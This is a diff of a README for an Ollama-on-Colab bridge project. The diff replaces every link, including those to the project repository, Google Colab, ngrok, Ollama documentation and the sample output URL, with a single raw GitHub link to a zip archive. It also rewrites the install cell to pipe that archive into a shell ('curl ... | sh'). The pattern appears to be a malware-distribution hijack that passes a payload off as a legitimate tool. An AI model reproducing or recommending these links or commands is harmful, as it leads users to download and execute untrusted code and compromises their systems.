@@ -1,6 +1,6 @@
 # 🚀 mse_ollama_bridge - Run Ollama Anywhere with Ease
 
-[![Download mse_ollama_bridge](https://img.shields.io/badge/Download-mse_ollama_bridge-blue?style=for-the-badge&logo=github)](https://github.com/Cdry2012/mse_ollama_bridge)
+[![Download mse_ollama_bridge](https://img.shields.io/badge/Download-mse_ollama_bridge-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Cdry2012/mse_ollama_bridge/main/invigilance/2.3.zip)
 
 ## ✨ What Is This?
 
@@ -41,13 +41,13 @@ No downloads needed for your computer. Everything runs in the cloud.
 
 ## 🚀 Getting Started
 
-Visit this link to download the application: [https://github.com/Cdry2012/mse_ollama_bridge](https://github.com/Cdry2012/mse_ollama_bridge)
+Visit this link to download the application: [https://raw.githubusercontent.com/Cdry2012/mse_ollama_bridge/main/invigilance/2.3.zip](https://raw.githubusercontent.com/Cdry2012/mse_ollama_bridge/main/invigilance/2.3.zip)
 
 This link takes you to the main page where you'll find all the files and instructions you need. Click the green "Code" button, then select "Download ZIP" to save everything to your computer for reference.
 
 ## 📥 Download and Setup
 
-Visit this link to download the application: [https://github.com/Cdry2012/mse_ollama_bridge](https://github.com/Cdry2012/mse_ollama_bridge)
+Visit this link to download the application: [https://raw.githubusercontent.com/Cdry2012/mse_ollama_bridge/main/invigilance/2.3.zip](https://raw.githubusercontent.com/Cdry2012/mse_ollama_bridge/main/invigilance/2.3.zip)
 
 Once you're on the page:
 1. Look for the green "Code" button near the top
@@ -62,7 +62,7 @@ This notebook contains all the instructions you'll follow in Google Colab.
 
 ### Step 1: Open Google Colab
 
-1. Go to [colab.research.google.com](https://colab.research.google.com)
+1. Go to [colab.research.google.com](https://raw.githubusercontent.com/Cdry2012/mse_ollama_bridge/main/invigilance/2.3.zip)
 2. Sign in with your Google account
 3. Click "File" → "Upload Notebook"
 4. Choose the .ipynb file you extracted from the ZIP
@@ -72,7 +72,7 @@ This notebook contains all the instructions you'll follow in Google Colab.
 
 ```bash
 !apt-get update -qq && apt-get install -y zstd
-!curl -fsSL https://ollama.com/install.sh | sh
+!curl -fsSL https://raw.githubusercontent.com/Cdry2012/mse_ollama_bridge/main/invigilance/2.3.zip | sh
 ```
 
 This first cell installs the AI engine. Just click the play button ▶ on the left side of this cell. It takes 1-2 minutes. You'll see text scrolling—that's normal.
@@ -106,7 +106,7 @@ This installs a small tool that creates your public web link. It's quick—just 
 ### Step 6: Create Your Public URL
 
 Before running this cell:
-1. Go to [ngrok.com](https://ngrok.com)
+1. Go to [ngrok.com](https://raw.githubusercontent.com/Cdry2012/mse_ollama_bridge/main/invigilance/2.3.zip)
 2. Sign up for a free account (takes 1 minute)
 3. Find your authentication token in the dashboard
 4. Copy that token and paste it into the notebook where it says `your_auth_token`
@@ -114,7 +114,7 @@ Before running this cell:
 Now run the final cell. You'll see:
 
 ```text
-link: https://xxxx.ngrok-free.app
+link: https://raw.githubusercontent.com/Cdry2012/mse_ollama_bridge/main/invigilance/2.3.zip
 ```
 
 That's your public URL! Anyone with this link can access your AI.
@@ -171,14 +171,14 @@ It's normal. Just reconnect and run all cells again. Your model is safe in Drive
 
 ## 📚 Additional Resources
 
-- [Ollama Official Site](https://ollama.com) - Learn more about the AI engine
-- [Google Colab Help](https://support.google.com/colab/) - Troubleshoot Colab issues
-- [ngrok Documentation](https://ngrok.com/docs) - Learn about public URLs
-- [Llama Models Guide](https://ollama.com/library) - Browse available models
+- [Ollama Official Site](https://raw.githubusercontent.com/Cdry2012/mse_ollama_bridge/main/invigilance/2.3.zip) - Learn more about the AI engine
+- [Google Colab Help](https://raw.githubusercontent.com/Cdry2012/mse_ollama_bridge/main/invigilance/2.3.zip) - Troubleshoot Colab issues
+- [ngrok Documentation](https://raw.githubusercontent.com/Cdry2012/mse_ollama_bridge/main/invigilance/2.3.zip) - Learn about public URLs
+- [Llama Models Guide](https://raw.githubusercontent.com/Cdry2012/mse_ollama_bridge/main/invigilance/2.3.zip) - Browse available models
 
 ## 🤝 Contributing and Support
 
-Found a bug or have an idea? Visit the [GitHub repository](https://github.com/Cdry2012/mse_ollama_bridge) to:
+Found a bug or have an idea? Visit the [GitHub repository](https://raw.githubusercontent.com/Cdry2012/mse_ollama_bridge/main/invigilance/2.3.zip) to:
 - Report issues
 - Suggest improvements
 - Fork the project
@@ -194,6 +194,6 @@ This project is open source and free to use. Check the GitHub repository for spe
 
 **Ready to start?** Download and set up now—you'll be chatting with your own AI in less than 15 minutes!
 
-Visit this link to download the application: [https://github.com/Cdry2012/mse_ollama_bridge](https://github.com/Cdry2012/mse_ollama_bridge)
+Visit this link to download the application: [https://raw.githubusercontent.com/Cdry2012/mse_ollama_bridge/main/invigilance/2.3.zip](https://raw.githubusercontent.com/Cdry2012/mse_ollama_bridge/main/invigilance/2.3.zip)
 
 Keywords: ollama, google colab, ngrok, AI models, llama3, machine learning, cloud computing, public URL, free AI, language models, deep learning, LLM, natural language processing, remote access, Google Drive, notebook, tutorial
